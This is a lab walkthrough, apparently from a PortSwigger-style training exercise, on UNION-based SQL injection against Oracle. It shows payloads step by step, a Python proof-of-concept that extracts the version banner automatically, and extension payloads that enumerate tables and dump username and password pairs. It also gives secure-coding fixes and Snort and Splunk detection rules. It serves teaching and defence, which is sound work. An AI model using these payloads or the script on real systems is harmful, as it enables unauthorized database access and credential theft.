# Lab Walkthrough: Querying Database Type & Version on Oracle

* **Vulnerability Type:** In-Band SQL Injection (UNION-Based)
* **Target Dialect:** Oracle Database
* **Skill Level:** Practitioner
* **Estimated Completion Time:** 20–30 minutes
* **Lab Status:** Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]
> The scripts, payloads, methodologies, and technical documentation contained in this repository are strictly intended for educational exercises, CTF competitions, and authorized security assessments conducted under explicit, written engagement contracts. Testing against systems without verifiable, signed authorization violates national and international legal statutes (e.g., Computer Fraud and Abuse Act [CFAA 18 U.S.C. § 1030], UK Computer Misuse Act 1990, and equivalent regional legislation). The author disclaims all liability for misuse.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](https://www.google.com/search?q=%231-vulnerability-architecture--mechanism)
2. [Oracle SQL Injection Constraints](https://www.google.com/search?q=%232-oracle-sql-injection-constraints)
3. [Lab Objectives & Verification Criteria](https://www.google.com/search?q=%233-lab-objectives--verification-criteria)
4. [Step-by-Step Exploitation Flow](https://www.google.com/search?q=%234-step-by-step-exploitation-flow)
* [Phase 1: Surface Mapping & Error Triggering](https://www.google.com/search?q=%23phase-1-surface-mapping--error-triggering)
* [Phase 2: Determining Column Count](https://www.google.com/search?q=%23phase-2-determining-column-count)
* [Phase 3: Data Type Probing](https://www.google.com/search?q=%23phase-3-data-type-probing)
* [Phase 4: Banner Extraction & Version Disclosure](https://www.google.com/search?q=%23phase-4-banner-extraction--version-disclosure)


5. [Automated Exploitation Script (Python PoC)](https://www.google.com/search?q=%235-automated-exploitation-script-python-poc)
6. [Cross-Engine Version Extraction Comparison](https://www.google.com/search?q=%236-cross-engine-version-extraction-comparison)
7. [Defense, Hardening & Secure Coding](https://www.google.com/search?q=%237-defense-hardening--secure-coding)
8. [SIEM Detection & Telemetry Analysis](https://www.google.com/search?q=%238-siem-detection--telemetry-analysis)
9. [Troubleshooting & Diagnostic Runbook](https://www.google.com/search?q=%239-troubleshooting--diagnostic-runbook)
10. [Practice Scenarios & Advanced Extensions](https://www.google.com/search?q=%2310-practice-scenarios--advanced-extensions)
11. [References & Standards](https://www.google.com/search?q=%2311-references--standards)

---

## 1. Vulnerability Architecture & Mechanism

UNION-based SQL injection occurs when user-controlled input is dynamically concatenated into an existing database query without parameterization or sanitization. This architectural oversight allows an attacker to append custom `UNION SELECT` operations, causing the database to merge query result sets and project external database objects directly into the application's user interface.

```text
Attacker HTTP Request:
GET /filter?category=Gifts'+UNION+SELECT+BANNER,NULL+FROM+v$version-- HTTP/1.1
                            │
                            ▼
┌────────────────────────────────────────────────────────────────────────┐
│ Web Application Layer (e.g., Java / PHP / Python backend)              │
│ Dynamic Query Construction:                                            │
│   $sql = "SELECT name, desc FROM products WHERE category = '"          │
│          . $_GET['category'] . "' AND released = 1";                   │
└───────────────────────────────────┬────────────────────────────────────┘
                                    │
                                    ▼
┌────────────────────────────────────────────────────────────────────────┐
│ Oracle SQL Database Engine                                             │
│ Executes Composite Query:                                              │
│   SELECT name, desc FROM products WHERE category = 'Gifts'             │
│   UNION                                                                │
│   SELECT BANNER, NULL FROM v$version-- ' AND released = 1              │
└───────────────────────────────────┬────────────────────────────────────┘
                                    │
                                    ▼
┌────────────────────────────────────────────────────────────────────────┐
│ Rendered Application Response                                          │
│ HTML Output reflects:                                                  │
│   <h3>Oracle Database 11g Express Edition Release 11.2.0.2.0...</h3>   │
└────────────────────────────────────────────────────────────────────────┘

```

> **Learning Checkpoint 1:** UNION injection requires direct feedback. If the application handles database queries asynchronously, executes writes without reflecting reads (`INSERT`/`UPDATE`), or swallows query output, UNION injection is not directly viable; the attack must pivot to Error-Based, Boolean Blind, or Out-of-Band (OOB) techniques.

---

## 2. Oracle SQL Injection Constraints

Oracle introduces two strict syntactical rules that break generic SQL injection payloads:

### A. The Mandatory `FROM` Clause (`DUAL` Table)

Unlike engines such as MySQL, SQLite, or PostgreSQL—which support arbitrary selections like `SELECT 1, 2;`—the Oracle engine adheres rigidly to the SQL standard: every query **must** contain a `FROM` clause.

* To select static literals, calculations, or system pseudo-columns without querying a user-defined relation, Oracle provides a built-in, single-row dummy table named `DUAL`.
* **Invalid on Oracle:** `SELECT 'test', 'data'--` $\rightarrow$ `ORA-00923: FROM keyword not found where expected`
* **Valid on Oracle:** `SELECT 'test', 'data' FROM DUAL--`

### B. Strict Data-Type Typing

In engines like MySQL or SQLite, columns undergo automatic, loose type coercion (e.g., an integer field happily coerces and displays string literals passed via `UNION`). Oracle enforces static data typing. If the injected statement maps a string expression into a column defined as `INTEGER` or `DATE`, the query fails immediately with type conversion errors (`ORA-01790`).

* `NULL` literals are polymorphic and can be implicitly cast to any data type (strings, numbers, timestamps, objects), making `NULL` the safest structural placeholder during the initial mapping phase.

---

## 3. Lab Objectives & Verification Criteria

* **Target Surface:** `GET /filter?category=<PAYLOAD>`
* **Primary Objective:** Extract the exact engine version string using `v$version` or `v$instance`.
* **Validation Signal:** The public web store reflects a full Oracle banner string (e.g., `Oracle Database 11g Express Edition Release...`) in the product catalog rendering area, satisfying the lab completion criteria.

---

## 4. Step-by-Step Exploitation Flow

```text
┌─────────────────────────────────────────────────────────────────────────┐
│                    METHODOLOGY & EXPLOITATION PHASES                    │
└─────────────────────────────────────────────────────────────────────────┘
  [Phase 1: Break]       Inject single quote (') -> Confirm ORA / 500 error
         │
  [Phase 2: Columns]     Determine width via ' UNION SELECT NULL... FROM DUAL--
         │
  [Phase 3: Data Types]  Map VARCHAR2 columns via 'abc' substitution
         │
  [Phase 4: Exfiltrate]  Query v$version (BANNER) to extract engine release

```

### Phase 1: Surface Mapping & Error Triggering

Intercept the base category filtering request via proxy (Burp Suite, OWASP ZAP, or Caido).

```http
GET /filter?category=Accessories HTTP/1.1
Host: your-lab-id.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close

```

Append a single quote to break the SQL literal context:

```http
GET /filter?category=Accessories' HTTP/1.1

```

* **Observed Response:** `HTTP/1.1 500 Internal Server Error`
* **Finding:** Unhandled server error indicates an unparameterized database parser failure.

---

### Phase 2: Determining Column Count

A valid `UNION` statement requires an identical number of columns to the primary query. On Oracle, every candidate `SELECT` must query `DUAL`.

Test using `ORDER BY`:

```sql
Accessories' ORDER BY 1--      -> 200 OK
Accessories' ORDER BY 2--      -> 200 OK
Accessories' ORDER BY 3--      -> 500 Internal Server Error

```

Validate using `UNION SELECT NULL`:

```sql
-- 1 Column:
Accessories'+UNION+SELECT+NULL+FROM+DUAL--
--> Response: HTTP 500 (ORA-01789: query block has incorrect number of result columns)

-- 2 Columns:
Accessories'+UNION+SELECT+NULL,NULL+FROM+DUAL--
--> Response: HTTP 200 OK (Match Confirmed)

```

* **Deduction:** The original product search query returns exactly **2 columns**.

---

### Phase 3: Data Type Probing

Test each column position independently to identify which indices support text reflections (`VARCHAR2`, `CHAR`).

#### Testing Column 1:

```sql
'+UNION+SELECT+'abc',NULL+FROM+DUAL--

```

* **Result:** `HTTP 200 OK`. Column 1 successfully renders `'abc'` into the application UI.

#### Testing Column 2:

```sql
'+UNION+SELECT+'abc','def'+FROM+DUAL--

```

* **Result:** `HTTP 200 OK`. Column 2 successfully renders `'def'`. Both columns accept alphanumeric string types.

---

### Phase 4: Banner Extraction & Version Disclosure

Oracle exposes version data via system dynamic performance views:

* Table: `v$version` $\rightarrow$ Target Column: `BANNER`
* Table: `v$instance` $\rightarrow$ Target Column: `VERSION`

Inject the payload referencing `v$version` into Column 1, keeping Column 2 as `NULL`:

```http
GET /filter?category='+UNION+SELECT+BANNER,NULL+FROM+v$version-- HTTP/1.1
Host: your-lab-id.web-security-academy.net
Connection: close

```

#### Server Response (Reflected Data Exfiltration):

```html
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Connection: close

<section class="maincontainer">
    <table>
        <tr>
            <th>Product</th>
        </tr>
        <tr>
            <td>
                <h3>Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production</h3>
                <p></p>
            </td>
        </tr>
    </table>
</section>

```

The database banner is parsed and returned in the HTTP response body.

> **Learning Checkpoint 2:** Why query `v$version` without appending `FROM DUAL`? `DUAL` is only needed when querying static literals or functions without a source table. Since `v$version` is an actual dictionary view present in Oracle, the query selects directly from it: `SELECT BANNER, NULL FROM v$version`.

---

## 5. Automated Exploitation Script (Python PoC)

This standalone Python script detects the column count, tests data types, and extracts the Oracle version banner automatically.

```python
#!/usr/bin/env python3
"""
Oracle SQL Injection - Database Version Extractor (PoC)
Designed for authorized lab and assessment environments.
"""

import sys
import re
import urllib.parse
import requests

# Disable SSL warnings for testing environments
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class OracleVersionExtractor:
    def __init__(self, target_url: str):
        self.target_url = target_url.rstrip("/")
        self.endpoint = f"{self.target_url}/filter"
        self.session = requests.Session()
        self.session.verify = False

    def send_payload(self, payload: str) -> requests.Response:
        params = {"category": payload}
        return self.session.get(self.endpoint, params=params)

    def determine_column_count(self, max_cols: int = 10) -> int:
        print("[*] Probing column width via Oracle DUAL structure...")
        for col_idx in range(1, max_cols + 1):
            null_placeholders = ",".join(["NULL"] * col_idx)
            payload = f"' UNION SELECT {null_placeholders} FROM DUAL--"
            response = self.send_payload(payload)
            
            if response.status_code == 200:
                print(f"[+] Identified valid column count: {col_idx}")
                return col_idx
        raise RuntimeError("[-] Failed to determine column count. Check WAF or injection context.")

    def extract_version(self, col_count: int):
        print("[*] Extracting Oracle version string from v$version...")
        # Populate column array: index 0 gets BANNER, remaining get NULL
        columns = ["NULL"] * col_count
        columns[0] = "BANNER"
        
        payload = f"' UNION SELECT {','.join(columns)} FROM v$version--"
        response = self.send_payload(payload)
        
        if response.status_code == 200:
            match = re.search(r"(Oracle Database [^<]+)", response.text)
            if match:
                print(f"\n[+] EXPLOIT SUCCESSFUL!")
                print(f"[+] Target Banner: {match.group(1).strip()}\n")
                return
        print("[-] Payload sent, but failed to parse Oracle banner from response.")

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <TARGET_BASE_URL>")
        print(f"Example: {sys.argv[0]} https://subdomain.web-security-academy.net")
        sys.exit(1)

    target_url = sys.argv[1]
    extractor = OracleVersionExtractor(target_url)
    try:
        columns = extractor.determine_column_count()
        extractor.extract_version(columns)
    except Exception as err:
        print(f"[!] Operation halted: {err}")
        sys.exit(1)

if __name__ == "__main__":
    main()

```

---

## 6. Cross-Engine Version Extraction Comparison

When enumerating infrastructure stacks during an assessment, different relational engines require specific queries, comment delimiters, and table references:

| Database System | Version Query / Function | Requires `FROM` Table? | Default System Table | Comment Syntax |
| --- | --- | --- | --- | --- |
| **Oracle** | `BANNER` / `BANNER_FULL` | **Yes** | `v$version`, `v$instance`, `DUAL` | `--` |
| **PostgreSQL** | `VERSION()` | **No** | None required | `--` |
| **Microsoft SQL Server (MSSQL)** | `@@VERSION` | **No** | None required | `--` |
| **MySQL** | `VERSION()` or `@@VERSION` | **No** | None required | `-- ` *(Note space)* or `#` |
| **SQLite** | `SQLITE_VERSION()` | **No** | None required | `--` |

---

## 7. Defense, Hardening & Secure Coding

### 1. Primary Remediation: Parameterized Queries

Dynamic query construction concatenating user input must be refactored to use prepared statements. Parameterization separates executable SQL code from user-supplied data literals.

#### Insecure Pattern (Java / JDBC):

```java
// VULNERABLE: Direct string interpolation
String category = request.getParameter("category");
String sql = "SELECT id, title, price FROM products WHERE category = '" + category + "' AND active = 1";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(sql);

```

#### Remediated Pattern (Java / Prepared Statement):

```java
// SECURE: Strict input parameterization
String category = request.getParameter("category");
String sql = "SELECT id, title, price FROM products WHERE category = ? AND active = 1";
PreparedStatement pstmt = connection.prepareStatement(sql);
pstmt.setString(1, category);
ResultSet rs = pstmt.executeQuery();

```

### 2. Database Account Hardening (Principle of Least Privilege)

* **Revoke Dictionary Privileges:** Ensure the web application user cannot query privileged dynamic management views like `V$VERSION`, `V$INSTANCE`, `ALL_USERS`, or `V$SESSION` unless required for core business functionality.
* **Schema Segregation:** Run applications under dedicated database accounts restricted to specific table schemas, preventing administrative view access.

---

## 8. SIEM Detection & Telemetry Analysis

### Network Signatures (Snort / Suricata)

```snort
alert http $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"ATTACK [Offensive-Sec] Oracle SQLi - v$version Banner Probe Detected";
    flow:to_server,established;
    content:"UNION",nocase;
    content:"SELECT",nocase;
    content:"v$version",nocase;
    pcre:"/(?i)UNION\s+SELECT\s+.+\s+FROM\s+v\$version/i";
    classtype:web-application-attack;
    sid:2026001;
    rev:1;
)

```

### Log-Based Detection Rule (Splunk Processing Language - SPL)

```spl
index=web_proxy sourcetype=access_combined status=200 OR status=500
| eval uri_decoded=urldecode(uri_query)
| regex uri_decoded="(?i)(UNION(\s+|\/\*.*\*\/)+SELECT.+FROM(\s+|\/\*.*\*\/)+(DUAL|v\$version|v\$instance))"
| stats count min(_time) as first_seen max(_time) as last_seen by client_ip, uri_path, uri_decoded, status
| where count > 0

```

---

## 9. Troubleshooting & Diagnostic Runbook

```text
Problem: HTTP 500 on all UNION attempts
 ├─ Did you include "FROM DUAL"? (Oracle requires an explicit table reference)
 ├─ Does the column count match? (Keep incrementing NULL entries)
 └─ Are you encountering type errors (ORA-01790)? (Use NULL placeholders first)

Problem: Query succeeds (200 OK), but no injected output appears
 ├─ Cause: Original query returns many rows; UI only shows the first row
 └─ Solution: Force primary query to return zero rows:
             GET /filter?category=INVALID_CATEGORY_XYZ'+UNION+SELECT...

```

* **Issue: `ORA-00923: FROM keyword not found where expected**`
* *Root Cause:* Tested generic payloads like `UNION SELECT NULL, NULL--` without appending `FROM DUAL`.
* *Resolution:* Add `FROM DUAL` before the trailing comment.


* **Issue: `ORA-01789: query block has incorrect number of result columns**`
* *Root Cause:* Column mismatch between the original application query and the injected `UNION` statement.
* *Resolution:* Systematically test column widths incrementing from 1 to 20 using `NULL` placeholders.


* **Issue: `ORA-01790: expression must have same datatype as corresponding expression**`
* *Root Cause:* Attempted to place string literals into numeric/date typed columns.
* *Resolution:* Revert all fields to `NULL` and map string targets one column at a time.



---

## 10. Practice Scenarios & Advanced Extensions

1. **System Schema Enumeration:**
Query the Oracle metadata catalog to list available tables:
```sql
'+UNION+SELECT+table_name,NULL+FROM+all_tables--

```


2. **Column Extraction:**
Enumerate columns within high-value tables (e.g., `USERS`):
```sql
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS'--

```


3. **Data Concatenation:**
If only a single column supports text output, concatenate multiple database fields using Oracle's pipe operator (`||`):
```sql
'+UNION+SELECT+username||'~'||password,NULL+FROM+users--

```



---

## 11. References & Standards

* [PortSwigger Web Security Academy: SQL Injection](https://www.google.com/search?q=https://portswigger.net/web-security/sql-injection)
* [Oracle Official Documentation: SQL Language Reference - The DUAL Table](https://www.google.com/search?q=https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/The-DUAL-Table.html)
* [OWASP Top 10-2021: A03 - Injection](https://www.google.com/search?q=https://owasp.org/Top10/A03_2021-Injection/)
* [MITRE ATT&CK Framework: Technique T1190 - Exploit Public-Facing Application](https://www.google.com/search?q=https://attack.mitre.org/techniques/T1190/)
